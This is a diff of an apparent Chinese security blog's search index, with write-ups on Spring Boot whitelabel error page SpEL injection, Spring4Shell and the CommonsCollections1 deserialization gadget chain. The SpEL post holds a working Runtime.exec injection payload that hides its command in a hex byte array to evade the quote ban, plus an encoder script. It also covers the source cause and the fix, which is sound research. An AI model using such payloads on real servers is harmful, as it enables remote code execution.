@@ -784,88 +784,9 @@
       </tags>
   </entry>
   <entry>
-    <title>Springboot whitelabel errorpage SPEL RCE</title>
-    <url>/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/</url>
-    <content><![CDATA[<h2 id="漏洞简介-2">漏洞简介</h2>
-<p>向一个可以能引发报错的controller传参，报错时会渲染出报错页面对输入的参数SPEL解析</p>
-<h2 id="影响范围-2">影响范围</h2>
-<p>Springboot: 1.1.0 ~ 1.1.12、1.2.0 ~ 1.2.7、1.3.0</p>
-<span id="more"></span>
-<h2 id="漏洞复现-2">漏洞复现</h2>
-<p>新建Springboot项目，设置为受影响的版本</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/1.png" class="">
-<p>编写一个通过输入能抛出错误的controller</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbooterrorpagerce;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(String spel)</span>&#123;</span><br><span class="line">        Integer.parseInt(spel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>传入SPEL表达式触发注入</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/2.png" class="">
-<h3 id="RCE注意事项">RCE注意事项</h3>
-<p>这里SPEL表达式是不能含有单双引号的，否则无法RCE，因此在exec的时候需要绕过：将引号字符串换成ascii表示</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
-<p>ascii转换：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>
-<h2 id="代码审计-4">代码审计</h2>
-<p>从报错页面渲染开始，在org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/3.png" class="">
-<p>this.template是报错页面的模板，渲染该页面是通过SPEL表达式解析来达到参数替换</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Whitelabel Error Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This application has no explicit mapping for /error, so you are seeing this as a fallback.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;created&#x27;</span>&gt;</span>$&#123;timestamp&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>this.replacePlaceholders方法传入模板和占位符解析器来渲染页面，来到<code>PropertyPlaceHolderHelper#parseStringValue</code>方法</p>
-<p>首先会对模板的所有被<code>$&#123;&#125;</code>包裹的占位符进行一层<code>$&#123;&#125;</code>去除，然后再递归去除多重包裹</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/4.png" class="">
-<p>获取占位符</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/5.png" class="">
-<p>获取到占位符就去解析对应的值</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/6.png" class="">
-<p>第一个被解析的是timestamp，这里用的是SPEL的解析器</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/7.png" class="">
-<p>占位符解析成功后，接着又会对解析出来的值再一次进行递归去除<code>$&#123;&#125;</code>+SPEL解析</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/8.png" class="">
-<p>同理，当解析最后一个占位符message时，<strong>先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析</strong></p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/9.png" class="">
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/10.png" class="">
-<p>就在此时解析了可控输入产生漏洞</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/11.png" class="">
-<h2 id="POP链-3">POP链</h2>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/12.png" class="">
-<h2 id="漏洞修复">漏洞修复</h2>
-<p>漏洞产生是由于先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析，<strong>两次操作使用的是同一个方法</strong>，而本质上只需要在从模板中解析占位符时候调用SPEL，无需对值进行解析</p>
-<p>因此官方在1.3.1版本更新了一个无递归解析的<code>NonRecursivePropertyPlaceholderHelper</code></p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/13.png" class="">
-<p>调用它的parseStringValue方法，然后再调用resolvePlaceholder方法时就会直接返回null而不会递归+SPEL解析</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/14.png" class="">
-<p>那么我们在<code>resolvePlaceholder()</code>处打断点：</p>
-<p>在从模板解析<code>$&#123;message&#125;</code>时：<code>this.resolver</code>不是<code>NonRecursivePropertyPlaceholderHelper</code>因此调用SPEL解析，解析结果是我们的传参字符串<code>$&#123;7*8&#125;</code></p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/15.png" class="">
-<p>解析字符串<code>$&#123;7*8&#125;</code>时发现是<code>NonRecursivePropertyPlaceholderHelper</code>因此返回null</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/16.png" class="">
-<p>返回null就不会进行递归解析了</p>
-<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/17.png" class="">
-<p>更新后把模板占位符和具体替换值分开操作而不公用同一个方法，仅对占位符进行解析而不解析具体值，从而避免了非法注入</p>
-<h2 id="参考-5">参考</h2>
-<blockquote>
-<p><a href="https://www.cnblogs.com/litlife/p/10183137.html">https://www.cnblogs.com/litlife/p/10183137.html</a></p>
-<p><a href="https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce">https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce</a></p>
-</blockquote>
-<h2 id="完-9">完</h2>
-<blockquote>
-<p>版权属于：Ho1aAs<br>
-欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
-版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Springboot</category>
-      </categories>
-      <tags>
-        <tag>Java安全</tag>
-        <tag>spel注入</tag>
-        <tag>springboot</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2022-22965: Spring4Shell</title>
     <url>/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/</url>
-    <content><![CDATA[<h2 id="漏洞简介-3">漏洞简介</h2>
+    <content><![CDATA[<h2 id="漏洞简介-2">漏洞简介</h2>
 <p>利用日志写shell完成RCE</p>
 <p>条件：</p>
 <ul class="lvl-0">
@@ -914,7 +835,7 @@
 <h3 id="Tomcat-AccessLogValve">Tomcat AccessLogValve</h3>
 <p>在tomcat/conf/server.xml定义了访问日志的valve，定义了生成访问日志的有关信息</p>
 <img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/10.png" class="" title="image-20220609103123906">
-<h2 id="漏洞复现-3">漏洞复现</h2>
+<h2 id="漏洞复现-2">漏洞复现</h2>
 <p><strong>重写configure方法</strong>，按照利用条件：jdk11+maven打包</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.springcorerce;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line">import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class SpringCoreRceApplication extends SpringBootServletInitializer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class="line">        return builder.sources(SpringCoreRceApplication.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        SpringApplication.run(SpringCoreRceApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>将war包放入tomcat的webapps目录，启动tomcat</p>
@@ -929,7 +850,7 @@
 <blockquote>
 <p><a href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/main/poc.py">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/main/poc.py</a></p>
 </blockquote>
-<h2 id="代码审计-5">代码审计</h2>
+<h2 id="代码审计-4">代码审计</h2>
 <h3 id="动态调试WAR包配置">动态调试WAR包配置</h3>
 <p>在tomcat的catalina.bat添加参数<code>set JPDA_ADDRESS=xxx</code>作为远程调试端口号</p>
 <img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/13.png" class="" title="image-20220609110708486">
@@ -985,13 +906,13 @@
 <p>只能获取Class.name或者是Name开头的属性</p>
 <h3 id="Tomcat-9-0-62">Tomcat 9.0.62</h3>
 <p>ParallelWebappClassLoader.getResource()返回值为null</p>
-<h2 id="参考-6">参考</h2>
+<h2 id="参考-5">参考</h2>
 <blockquote>
 <p><a href="https://tanzu.vmware.com/security/cve-2022-22965">https://tanzu.vmware.com/security/cve-2022-22965</a></p>
 <p><a href="https://paper.seebug.org/1877/">https://paper.seebug.org/1877/</a></p>
 <p>p1n93r师傅的pdf</p>
 </blockquote>
-<h2 id="完-10">完</h2>
+<h2 id="完-9">完</h2>
 <blockquote>
 <p>版权属于：Ho1aAs<br>
 欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
@@ -1005,6 +926,244 @@
         <tag>Java安全</tag>
         <tag>springboot</tag>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Springboot whitelabel errorpage SPEL RCE</title>
+    <url>/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/</url>
+    <content><![CDATA[<h2 id="漏洞简介-3">漏洞简介</h2>
+<p>向一个可以能引发报错的controller传参，报错时会渲染出报错页面对输入的参数SPEL解析</p>
+<h2 id="影响范围-2">影响范围</h2>
+<p>Springboot: 1.1.0 ~ 1.1.12、1.2.0 ~ 1.2.7、1.3.0</p>
+<span id="more"></span>
+<h2 id="漏洞复现-3">漏洞复现</h2>
+<p>新建Springboot项目，设置为受影响的版本</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/1.png" class="">
+<p>编写一个通过输入能抛出错误的controller</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbooterrorpagerce;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(String spel)</span>&#123;</span><br><span class="line">        Integer.parseInt(spel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>传入SPEL表达式触发注入</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/2.png" class="">
+<h3 id="RCE注意事项">RCE注意事项</h3>
+<p>这里SPEL表达式是不能含有单双引号的，否则无法RCE，因此在exec的时候需要绕过：将引号字符串换成ascii表示</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
+<p>ascii转换：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="代码审计-5">代码审计</h2>
+<p>从报错页面渲染开始，在org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/3.png" class="">
+<p>this.template是报错页面的模板，渲染该页面是通过SPEL表达式解析来达到参数替换</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Whitelabel Error Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This application has no explicit mapping for /error, so you are seeing this as a fallback.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;created&#x27;</span>&gt;</span>$&#123;timestamp&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>this.replacePlaceholders方法传入模板和占位符解析器来渲染页面，来到<code>PropertyPlaceHolderHelper#parseStringValue</code>方法</p>
+<p>首先会对模板的所有被<code>$&#123;&#125;</code>包裹的占位符进行一层<code>$&#123;&#125;</code>去除，然后再递归去除多重包裹</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/4.png" class="">
+<p>获取占位符</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/5.png" class="">
+<p>获取到占位符就去解析对应的值</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/6.png" class="">
+<p>第一个被解析的是timestamp，这里用的是SPEL的解析器</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/7.png" class="">
+<p>占位符解析成功后，接着又会对解析出来的值再一次进行递归去除<code>$&#123;&#125;</code>+SPEL解析</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/8.png" class="">
+<p>同理，当解析最后一个占位符message时，<strong>先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析</strong></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/9.png" class="">
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/10.png" class="">
+<p>就在此时解析了可控输入产生漏洞</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/11.png" class="">
+<h2 id="POP链-3">POP链</h2>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/12.png" class="">
+<h2 id="漏洞修复">漏洞修复</h2>
+<p>漏洞产生是由于先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析，<strong>两次操作使用的是同一个方法</strong>，而本质上只需要在从模板中解析占位符时候调用SPEL，无需对值进行解析</p>
+<p>因此官方在1.3.1版本更新了一个无递归解析的<code>NonRecursivePropertyPlaceholderHelper</code></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/13.png" class="">
+<p>调用它的parseStringValue方法，然后再调用resolvePlaceholder方法时就会直接返回null而不会递归+SPEL解析</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/14.png" class="">
+<p>那么我们在<code>resolvePlaceholder()</code>处打断点：</p>
+<p>在从模板解析<code>$&#123;message&#125;</code>时：<code>this.resolver</code>不是<code>NonRecursivePropertyPlaceholderHelper</code>因此调用SPEL解析，解析结果是我们的传参字符串<code>$&#123;7*8&#125;</code></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/15.png" class="">
+<p>解析字符串<code>$&#123;7*8&#125;</code>时发现是<code>NonRecursivePropertyPlaceholderHelper</code>因此返回null</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/16.png" class="">
+<p>返回null就不会进行递归解析了</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/17.png" class="">
+<p>更新后把模板占位符和具体替换值分开操作而不公用同一个方法，仅对占位符进行解析而不解析具体值，从而避免了非法注入</p>
+<h2 id="参考-6">参考</h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/litlife/p/10183137.html">https://www.cnblogs.com/litlife/p/10183137.html</a></p>
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce">https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce</a></p>
+</blockquote>
+<h2 id="完-10">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Springboot</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>spel注入</tag>
+        <tag>springboot</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CommonsCollections1与ysoserial分析</title>
+    <url>/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="前言-2">前言</h2>
+<p>ApacheCommonsCollections封装了Java集合类对象。</p>
+<p><strong>验证环境依赖为jdk1.7 + commons-collections3.1</strong>，建议用maven</p>
+<span id="more"></span>
+<h3 id="maven配置">maven配置</h3>
+<p>IDEA新建maven环境，在pom.xml添加dependency</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Transformer接口">Transformer接口</h2>
+<p>Transformer接口定义了一个transform方法，将输入对象转换成输出对象</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/1.png" class="">
+<h3 id="ConstantTransformer类——输入任意对象输出固定对象">ConstantTransformer类——输入任意对象输出固定对象</h3>
+<p>ConstantTransformer类实现了Transformer接口</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/2.png" class="">
+<p>它重写了接口的transform方法：传入任何对象都将返回设定好的Constant对象，设定的Constant对象在构造器中传入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(constantTransformer.transform(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/3.png" class="">
+<p>这个方法很简单，就是一个转换器，输出一个固定的对象。</p>
+<h3 id="InvokerTransformer类——通过反射调用类方法">InvokerTransformer类——通过反射调用类方法</h3>
+<p>InvokerTransformer类实现了Transformer接口，<strong>并且还支持序列化</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/4.png" class="">
+<p>InvokerTransformer重写的的transform方法采用反射，可以调用类方法。在构造的时候可以传入待调用的方法名、参数类型、参数。<strong>最后会返回方法的返回值</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/5.png" class="">
+<p>传入一个实例，然后就能反射调用该实例的方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> <span class="string">&quot;toString&quot;</span>;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(method, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        System.out.println(invokerTransformer.transform(<span class="number">123</span>).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/6.png" class="">
+<p><strong>也就是说一旦传入了Runtime的实例就能实现命令执行</strong></p>
+<h3 id="ChainedTransformer类——依次通过反射调用多个类方法">ChainedTransformer类——依次通过反射调用多个类方法</h3>
+<p>ChainedTransformer类也实现了Transformer接口，也支持序列化</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/7.png" class="">
+<p>它的transform方法比较特殊：定义它的时候传入了一个Transformer数组，该方法就会依次调用每个Transformer的transform方法，并且调用方法传入的对象是上一个Transformer的transform方法的返回值</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/8.png" class="">
+<h2 id="TransformedMap类">TransformedMap类</h2>
+<p>上面方式最后的命令执行都是靠ChainedTransformer的transform方法，问题来了：如何触发ChainedTransformer的transform方法</p>
+<p>org.apache.commons.collections.map的TransformedMap类，该类继承自AbstractInputCheckedMapDecorator，支持序列化</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/9.png" class="">**这个类的作用正如它的静态方法decorate所言，修饰一个Map对象。只要Map对象进行put/putAll操作，就会触发回调函数**
+<h3 id="decorate方法——实例化TransformedMap类">decorate方法——实例化TransformedMap类</h3>
+<p>首先，实例化TransformedMap类是不允许的，因为构造器是protected的</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/10.png" class="">
+<p>它自带一个静态方法decorate,用于实例化</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/11.png" class="">
+<p>实例化需要传入三个参数——被修饰的Map对象、对键与值操作的Transformer对象</p>
+<h3 id="transformKey-transformValue-transformMap-checkSetValue方法——触发回调函数transform">transformKey/transformValue/transformMap/checkSetValue方法——触发回调函数transform</h3>
+<p>触发键值的Transformer的transform方法作为回调函数，如果传入的是Map最终也是会回到键值触发对应transform方法的</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/12.png" class="">
+<p><strong>这里就跟上面连上了，找到触发transform方法的入口了，也就是说我们要新建一个TransformedMap，然后设置keyTransformer/valueTransformer为上面为了RCE构造的ChainedTransformer</strong>，接着找这三个方法在哪触发</p>
+<p>另一个方法checkSetValue也能触发回调</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/13.png" class="">
+<h3 id="put-putAll方法——调用transformKey-transformValue">put/putAll方法——调用transformKey/transformValue</h3>
+<p>这就是TransformedMap的功能函数了，对键值进行操作：如果设置了keyTransformer/valueTransformer，每次put前要将键值过一遍对应Transformer的transform方法</p>
